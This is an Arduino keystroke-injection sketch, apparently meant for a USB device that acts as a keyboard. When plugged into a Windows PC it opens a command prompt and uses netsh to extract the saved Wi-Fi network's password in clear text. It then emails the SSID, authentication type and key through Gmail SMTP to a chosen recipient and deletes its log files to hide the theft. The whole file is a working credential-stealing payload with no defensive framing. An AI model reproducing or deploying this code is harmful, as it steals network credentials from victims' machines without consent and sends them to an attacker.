//Replace ACCOUNT with the sender's email address
//Replace PASSWORD with the sender's password
//Replace RECIPIENT with the recipient's email
void setup()                       // put your setup code here, to run once:
{
    delay(2000);                   // wait 2 seconds
    Keyboard.press(KEY_LEFT_GUI);  // press windows key
    Keyboard.press('d');           // press "d"
    Keyboard.releaseAll();         // release both the windows key and the "d" key
    Keyboard.press(KEY_LEFT_GUI);  // press and hold the windows key
    Keyboard.press('r');           // press and hold the "r" key
    Keyboard.releaseAll();         // release both the windows key and the "r" key
    delay(1000);                   // wait 1 second
    Keyboard.print("cmd");         // input "cmd" into the run window
    delay(1000);                   // wait 1 second
    Keyboard.press(KEY_ENTER);     // press enter
    Keyboard.releaseAll();         // *1 release enter
    delay(1000);  
  //Getting SSID
    Keyboard.print("cd \"%USERPROFILE%/Desktop\" & for /f \"tokens=2 delims=: \" %A in ('netsh wlan show interface ^| findstr \"SSID\" ^| findstr /v \"BSSID\"') do set A=%A");
    Keyboard.press(KEY_ENTER);
    Keyboard.release(KEY_ENTER);
  //Creating A.txt
    Keyboard.print("netsh wlan show profiles %A% key=clear | findstr /c:\"Network type\" /c:\"Authentication\" /c:\"Key Content\" | findstr /v \"broadcast\" | findstr /v \"Radio\">>A.txt");
    Keyboard.press(KEY_ENTER);
    Keyboard.release(KEY_ENTER);
  //Get network type
    Keyboard.print("for /f \"tokens=3 delims=: \" %A in ('findstr \"Network type\" A.txt') do set B=%A");
    Keyboard.press(KEY_ENTER);
    Keyboard.release(KEY_ENTER);
  //Get authentication
    Keyboard.print("for /f \"tokens=2 delims=: \" %A in ('findstr \"Authentication\" A.txt') do set C=%A");
    Keyboard.press(KEY_ENTER);
    Keyboard.release(KEY_ENTER);
  //Get password
    Keyboard.print("for /f \"tokens=3 delims=: \" %A in ('findstr \"Key Content\" A.txt') do set D=%A");
    Keyboard.press(KEY_ENTER);
    Keyboard.release(KEY_ENTER);
  //Delete A.txt
    Keyboard.print("del A.txt");
    Keyboard.press(KEY_ENTER);
    Keyboard.release(KEY_ENTER);
  //Create Log.txt
    Keyboard.print("echo SSID: %A%>>Log.txt & echo Network type: %B%>>Log.txt & echo Authentication: %C%>>Log.txt & echo Password: %D%>>Log.txt");
    Keyboard.press(KEY_ENTER);
    Keyboard.release(KEY_ENTER);
  //Mail Log.txt
    Keyboard.print("powershell");
    Keyboard.press(KEY_ENTER);
    Keyboard.release(KEY_ENTER);
    Keyboard.print("$SMTPServer = 'smtp.gmail.com'");
    Keyboard.press(KEY_ENTER);
    Keyboard.release(KEY_ENTER);
    Keyboard.print("$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)");
    Keyboard.press(KEY_ENTER);
    Keyboard.release(KEY_ENTER);
    Keyboard.print("$SMTPInfo.EnableSsl = $true");
    Keyboard.press(KEY_ENTER);
    Keyboard.release(KEY_ENTER);
    Keyboard.print("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('ACCOUNT@gmail.com', 'PASSWORD')");
    Keyboard.press(KEY_ENTER);
    Keyboard.release(KEY_ENTER);
    Keyboard.print("$ReportEmail = New-Object System.Net.Mail.MailMessage");
    Keyboard.press(KEY_ENTER);
    Keyboard.release(KEY_ENTER);
    Keyboard.print("$ReportEmail.From = 'ACCOUNT@gmail.com'");
    Keyboard.press(KEY_ENTER);
    Keyboard.release(KEY_ENTER);
    Keyboard.print("$ReportEmail.To.Add('RECIPIENT')");
    Keyboard.press(KEY_ENTER);
    Keyboard.release(KEY_ENTER);
    Keyboard.print("$ReportEmail.Subject = 'WiFi key grabber'");
    Keyboard.press(KEY_ENTER);
    Keyboard.release(KEY_ENTER);
    Keyboard.print("$ReportEmail.Body = (Get-Content Log.txt | out-string)");
    Keyboard.press(KEY_ENTER);
    Keyboard.release(KEY_ENTER);
    Keyboard.print("$SMTPInfo.Send($ReportEmail)");
    Keyboard.press(KEY_ENTER);
    Keyboard.release(KEY_ENTER);
    delay(5000);
  //Delete Log.txt and exit
    Keyboard.print("del Log.txt");
    Keyboard.press(KEY_ENTER);
    Keyboard.release(KEY_ENTER);
    delay(3000);
    Keyboard.print("exit");
    Keyboard.press(KEY_ENTER);
    Keyboard.release(KEY_ENTER);
    delay(1500);
    Keyboard.print("exit");
    Keyboard.press(KEY_ENTER);
    Keyboard.release(KEY_ENTER);
}
void loop() // put your main code here, to run repeatedly:
{
}
